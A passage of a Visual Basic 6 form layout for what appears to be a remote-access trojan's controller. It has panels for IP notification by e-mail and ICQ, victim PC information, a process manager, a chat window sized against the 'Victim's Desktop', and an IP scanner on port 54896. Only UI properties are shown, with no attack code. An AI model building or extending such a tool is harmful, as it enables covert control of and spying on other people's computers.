         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   0
         Left            =   1370
         Style           =   1  'Graphical
         TabIndex        =   124
         ToolTipText     =   "Enable e-mail notify"
         Top             =   1710
         Width           =   1000
      End
      Begin VB.TextBox txtMailto_4 
         Height          =   285
         Left            =   1350
         MaxLength       =   25
         TabIndex        =   121
         ToolTipText     =   "Your e-mail address"
         Top             =   1230
         Width           =   2385
      End
      Begin VB.TextBox txtSMTP_4 
         Height          =   285
         Left            =   1350
         MaxLength       =   25
         TabIndex        =   119
         ToolTipText     =   "Your SMTP server"
         Top             =   810
         Width           =   2385
      End
      Begin VB.Image Image4 
         Height          =   480
         Left            =   240
         Picture         =   "frmMain.frx":20CA
         Top             =   1620
         Width           =   480
      End
      Begin VB.Image Image3 
         Height          =   480
         Left            =   240
         Picture         =   "frmMain.frx":23D4
         Top             =   2760
         Width           =   480
      End
      Begin VB.Label Label84 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "UIN:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   900
         TabIndex        =   315
         Top             =   2880
         Width           =   330
      End
      Begin VB.Label Label83 
         BackStyle       =   0  'Transparent
         Caption         =   "ICQ Notify"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   314
         Top             =   2460
         Width           =   1125
      End
      Begin VB.Label Label33 
         BackStyle       =   0  'Transparent
         Caption         =   "E-Mail Notify"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   123
         Top             =   450
         Width           =   1125
      End
      Begin VB.Label Label32 
         BackStyle       =   0  'Transparent
         Caption         =   "Notify To Mail:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   210
         TabIndex        =   122
         Top             =   1260
         Width           =   1035
      End
      Begin VB.Label Label31 
         BackStyle       =   0  'Transparent
         Caption         =   "SMTP Server:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   270
         TabIndex        =   120
         Top             =   840
         Width           =   1185
      End
      Begin VB.Label Label30 
         BackStyle       =   0  'Transparent
         Caption         =   "IP Notify                                                                    "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   118
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   1
      Left            =   1920
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   6
      Top             =   1050
      Width           =   4065
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   5
         Left            =   1270
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   78
         Text            =   "-"
         Top             =   1340
         Width           =   2655
      End
      Begin VB.CommandButton cmdGetPCInfo_1 
         Caption         =   "Get"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   76
         ToolTipText     =   "Get PC Information"
         Top             =   3630
         Width           =   945
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   390
         Index           =   14
         Left            =   1050
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   75
         Text            =   "frmMain.frx":26DE
         Top             =   3090
         Width           =   2865
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   13
         Left            =   840
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   74
         Text            =   "-"
         Top             =   2895
         Width           =   3075
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   12
         Left            =   1020
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   73
         Text            =   "-"
         Top             =   2700
         Width           =   2895
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   11
         Left            =   1110
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   72
         Text            =   "-"
         Top             =   2520
         Width           =   2805
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   10
         Left            =   1020
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   71
         Text            =   "-"
         Top             =   2325
         Width           =   2895
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   9
         Left            =   1350
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   70
         Text            =   "-"
         Top             =   2120
         Width           =   2565
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   8
         Left            =   810
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   69
         Text            =   "-"
         Top             =   1920
         Width           =   3105
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   7
         Left            =   1050
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   68
         Text            =   "-"
         Top             =   1725
         Width           =   2865
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   6
         Left            =   1110
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   67
         Text            =   "-"
         Top             =   1530
         Width           =   2805
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   4
         Left            =   1410
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   66
         Text            =   "-"
         Top             =   1140
         Width           =   2505
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   3
         Left            =   1260
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   65
         Text            =   "-"
         Top             =   940
         Width           =   2655
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   2
         Left            =   1080
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   64
         Text            =   "-"
         Top             =   750
         Width           =   2835
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   1
         Left            =   1050
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   63
         Text            =   "-"
         Top             =   560
         Width           =   2865
      End
      Begin VB.TextBox txtPCInfo_1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000010&
         BorderStyle     =   0  'None
         Height          =   195
         Index           =   0
         Left            =   1410
         Locked          =   -1  'True
         MousePointer    =   1  'Arrow
         TabIndex        =   62
         Text            =   "-"
         Top             =   360
         Width           =   2505
      End
      Begin VB.Label lblPCInfo 
         BackStyle       =   0  'Transparent
         Caption         =   $"frmMain.frx":26E2
         ForeColor       =   &H80000008&
         Height          =   2925
         Left            =   120
         TabIndex        =   61
         Top             =   360
         Width           =   1305
      End
      Begin VB.Label Label16 
         BackStyle       =   0  'Transparent
         Caption         =   "PC Information                                                         "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   60
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   15
      Left            =   3600
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   20
      Top             =   1890
      Width           =   4065
      Begin MSComctlLib.ListView ListView_15 
         Height          =   2565
         Left            =   120
         TabIndex        =   310
         Top             =   360
         Width           =   3795
         _ExtentX        =   6694
         _ExtentY        =   4524
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "ImageList1"
         SmallIcons      =   "ImageList1"
         ColHdrIcons     =   "ImageList1"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Process"
            Object.Width           =   4322
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Priority"
            Object.Width           =   1729
         EndProperty
      End
      Begin VB.CommandButton cmdEndTask_15 
         Caption         =   "End Task"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1320
         Style           =   1  'Graphical
         TabIndex        =   155
         ToolTipText     =   "End task process"
         Top             =   3630
         Width           =   1100
      End
      Begin VB.TextBox txtPath_15 
         Height          =   285
         Left            =   630
         Locked          =   -1  'True
         TabIndex        =   153
         ToolTipText     =   "Process path"
         Top             =   3000
         Width           =   3270
      End
      Begin VB.OptionButton Opt_15 
         BackColor       =   &H80000010&
         Caption         =   "Idle"
         ForeColor       =   &H80000008&
         Height          =   225
         Index           =   64
         Left            =   3360
         TabIndex        =   150
         Top             =   3360
         Width           =   585
      End
      Begin VB.OptionButton Opt_15 
         BackColor       =   &H80000010&
         Caption         =   "Normal"
         ForeColor       =   &H80000008&
         Height          =   225
         Index           =   32
         Left            =   2550
         TabIndex        =   149
         Top             =   3360
         Width           =   795
      End
      Begin VB.OptionButton Opt_15 
         BackColor       =   &H80000010&
         Caption         =   "High"
         ForeColor       =   &H80000008&
         Height          =   225
         Index           =   128
         Left            =   1890
         TabIndex        =   148
         Top             =   3360
         Width           =   615
      End
      Begin VB.OptionButton Opt_15 
         BackColor       =   &H80000010&
         Caption         =   "Realtime"
         ForeColor       =   &H80000008&
         Height          =   225
         Index           =   256
         Left            =   930
         TabIndex        =   147
         Top             =   3360
         Width           =   945
      End
      Begin VB.CommandButton cmdRefresh_15 
         Caption         =   "Refresh"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   146
         ToolTipText     =   "Refresh process list"
         Top             =   3630
         Width           =   1100
      End
      Begin VB.CommandButton cmdPriority_15 
         Caption         =   "Thread Priority"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2520
         Style           =   1  'Graphical
         TabIndex        =   145
         ToolTipText     =   "Thread priority process"
         Top             =   3630
         Width           =   1395
      End
      Begin VB.Label Label37 
         BackStyle       =   0  'Transparent
         Caption         =   "Process Manager                                                    "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   144
         Top             =   90
         Width           =   3800
      End
      Begin VB.Label Label39 
         BackStyle       =   0  'Transparent
         Caption         =   "Path:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   180
         TabIndex        =   152
         Top             =   3030
         Width           =   435
      End
      Begin VB.Label Label38 
         BackStyle       =   0  'Transparent
         Caption         =   "Priority:"
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   180
         TabIndex        =   151
         Top             =   3360
         Width           =   615
      End
   End
   Begin VB.ListBox ListProID_15 
      Height          =   255
      Left            =   2460
      TabIndex        =   357
      Top             =   6030
      Width           =   1065
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   7
      Left            =   2640
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   12
      Top             =   1410
      Width           =   4065
      Begin VB.TextBox txtSample_7 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   315
         Index           =   1
         Left            =   3090
         Locked          =   -1  'True
         TabIndex        =   289
         Text            =   "text"
         Top             =   2910
         Width           =   510
      End
      Begin VB.TextBox txtFSize_7 
         Height          =   315
         Index           =   1
         Left            =   3090
         MaxLength       =   2
         TabIndex        =   288
         Text            =   "10"
         Top             =   2490
         Width           =   500
      End
      Begin VB.TextBox txtSample_7 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00E0E0E0&
         Height          =   315
         Index           =   0
         Left            =   1260
         Locked          =   -1  'True
         TabIndex        =   283
         Text            =   "text"
         Top             =   2910
         Width           =   510
      End
      Begin VB.TextBox txtFSize_7 
         Height          =   315
         Index           =   0
         Left            =   1260
         MaxLength       =   2
         TabIndex        =   282
         Text            =   "10"
         Top             =   2490
         Width           =   500
      End
      Begin VB.CommandButton cmdChat_7 
         Caption         =   "Chat"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1380
         Style           =   1  'Graphical
         TabIndex        =   277
         ToolTipText     =   "Chat"
         Top             =   3510
         Width           =   1200
      End
      Begin VB.TextBox txtSize_7 
         BackColor       =   &H80000010&
         Height          =   315
         Left            =   1380
         Locked          =   -1  'True
         MaxLength       =   3
         TabIndex        =   274
         Text            =   "25"
         Top             =   1140
         Width           =   420
      End
      Begin VB.VScrollBar VScrollSize_7 
         Height          =   315
         Left            =   1890
         Max             =   25
         Min             =   100
         TabIndex        =   273
         Top             =   1140
         Value           =   25
         Width           =   315
      End
      Begin VB.TextBox txtNickname_7 
         Height          =   285
         Left            =   1650
         MaxLength       =   20
         TabIndex        =   271
         Text            =   "nickless"
         ToolTipText     =   "Your nickname"
         Top             =   570
         Width           =   2200
      End
      Begin VB.Label lbltxtColor_7 
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   3090
         TabIndex        =   291
         Top             =   2070
         Width           =   495
      End
      Begin VB.Label lbltxtColor_7 
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   0
         Left            =   1260
         TabIndex        =   290
         Top             =   2070
         Width           =   495
      End
      Begin VB.Shape ShapetxtColor_7 
         BackColor       =   &H0000FFFF&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00E0E0E0&
         Height          =   315
         Index           =   1
         Left            =   3090
         Top             =   2070
         Width           =   495
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Sample:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   17
         Left            =   2460
         TabIndex        =   287
         Top             =   2940
         Width           =   570
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Font Size:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   16
         Left            =   2310
         TabIndex        =   286
         Top             =   2490
         Width           =   720
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Text Color:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   15
         Left            =   2220
         TabIndex        =   285
         Top             =   2100
         Width           =   810
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "           Client           "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   14
         Left            =   2190
         TabIndex        =   284
         Top             =   1710
         Width           =   1395
      End
      Begin VB.Shape ShapetxtColor_7 
         BackColor       =   &H00E0E0E0&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00E0E0E0&
         Height          =   315
         Index           =   0
         Left            =   1260
         Top             =   2070
         Width           =   495
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Sample:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   13
         Left            =   630
         TabIndex        =   281
         Top             =   2940
         Width           =   570
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Font Size:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   12
         Left            =   480
         TabIndex        =   280
         Top             =   2490
         Width           =   720
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Text Color:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   11
         Left            =   390
         TabIndex        =   279
         Top             =   2100
         Width           =   810
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "           Victim           "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   10
         Left            =   360
         TabIndex        =   278
         Top             =   1710
         Width           =   1395
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "% Of Victim's Desktop"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   9
         Left            =   2250
         TabIndex        =   276
         Top             =   1170
         Width           =   1575
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Victim Chat Size:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   8
         Left            =   150
         TabIndex        =   275
         Top             =   1170
         Width           =   1185
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Nickname For Chat:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   7
         Left            =   180
         TabIndex        =   272
         Top             =   600
         Width           =   1410
      End
      Begin VB.Label Label75 
         BackStyle       =   0  'Transparent
         Caption         =   "Chat                                                                              "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   270
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.Timer TimerIPpers 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   2040
      Top             =   6630
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   0
      Left            =   1750
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   0
      Top             =   570
      Width           =   4065
      Begin VB.CommandButton cmdClear_0 
         Caption         =   "Clear"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3150
         Style           =   1  'Graphical
         TabIndex        =   324
         ToolTipText     =   "Clear list"
         Top             =   1320
         Width           =   765
      End
      Begin VB.TextBox txtIP_0 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   3150
         TabIndex        =   126
         Top             =   30
         Visible         =   0   'False
         Width           =   735
      End
      Begin VB.ListBox ListIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2010
         ItemData        =   "frmMain.frx":27C0
         Left            =   100
         List            =   "frmMain.frx":27C2
         TabIndex        =   53
         Top             =   1830
         Width           =   3800
      End
      Begin VB.TextBox txtDelay_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   2610
         MaxLength       =   3
         TabIndex        =   51
         Text            =   "200"
         ToolTipText     =   "delay time millionsecond"
         Top             =   1320
         Width           =   420
      End
      Begin VB.TextBox txtPort_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   900
         MaxLength       =   5
         TabIndex        =   49
         Text            =   "54896"
         ToolTipText     =   "Port number to scan"
         Top             =   1320
         Width           =   675
      End
      Begin VB.CommandButton cmdStop_0 
         Caption         =   "Stop"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3150
         Style           =   1  'Graphical
         TabIndex        =   48
         ToolTipText     =   "Stop"
         Top             =   870
         Width           =   765
      End
      Begin VB.CommandButton cmdScan_0 
         Caption         =   "Scan"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   3150
         Style           =   1  'Graphical
         TabIndex        =   47
         ToolTipText     =   "Scan"
         Top             =   420
         Width           =   765
      End
      Begin VB.TextBox txtEIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   3
         Left            =   2610
         MaxLength       =   3
         TabIndex        =   43
         Top             =   870
         Width           =   420
      End
      Begin VB.TextBox txtEIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   2
         Left            =   2040
         MaxLength       =   3
         TabIndex        =   42
         Top             =   870
         Width           =   420
      End
      Begin VB.TextBox txtEIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   1
         Left            =   1470
         MaxLength       =   3
         TabIndex        =   41
         Top             =   870
         Width           =   420
      End
      Begin VB.TextBox txtEIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   0
         Left            =   900
         MaxLength       =   3
         TabIndex        =   40
         Top             =   870
         Width           =   420
      End
      Begin VB.TextBox txtSIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   3
         Left            =   2610
         MaxLength       =   3
         TabIndex        =   36
         Top             =   420
         Width           =   420
      End
      Begin VB.TextBox txtSIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   2
         Left            =   2040
         MaxLength       =   3
         TabIndex        =   35
         Top             =   420
         Width           =   420
      End
      Begin VB.TextBox txtSIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   1
         Left            =   1470
         MaxLength       =   3
         TabIndex        =   34
         Top             =   420
         Width           =   420
      End
      Begin VB.TextBox txtSIP_0 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   0
         Left            =   900
         MaxLength       =   3
         TabIndex        =   33
         Top             =   420
         Width           =   420
      End
      Begin VB.Label Label78 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "IP Scanner                                                                 "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   296
         Top             =   90
         Width           =   3800
      End
      Begin VB.Label Label15 
         BackStyle       =   0  'Transparent
         Caption         =   "Delay:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
